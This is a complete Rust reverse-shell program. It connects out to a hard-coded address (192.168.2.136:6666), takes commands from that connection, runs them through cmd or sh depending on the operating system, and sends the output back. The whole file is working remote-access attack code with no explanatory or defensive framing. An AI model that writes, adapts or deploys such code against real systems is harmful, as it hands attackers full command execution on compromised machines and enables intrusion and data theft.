use std::net::TcpStream;
use std::io::{self, Write, Read};
use std::process::{Command};

fn main() -> io::Result<()> {
    let mut stream = TcpStream::connect("192.168.2.136:6666")?;
    
    loop {
        let mut buffer = [0; 512];
        let bytes_read = stream.read(&mut buffer)?;
        
        if bytes_read == 0 {
            continue;
        }
        
        let command = String::from_utf8_lossy(&buffer[..bytes_read]);
        let output = if cfg!(target_os = "windows") {
            Command::new("cmd")
                .args(&["/C", &command])
                .output()
        } else {
            Command::new("sh")
                .arg("-c")
                .arg(command.to_string())
                .output()
        };
        
        match output {
            Ok(output) => {
                stream.write_all(&output.stdout)?;
                stream.write_all(&output.stderr)?;
            },
            Err(err) => {
                stream.write_all(err.to_string().as_bytes())?;
            }
        }
    }
}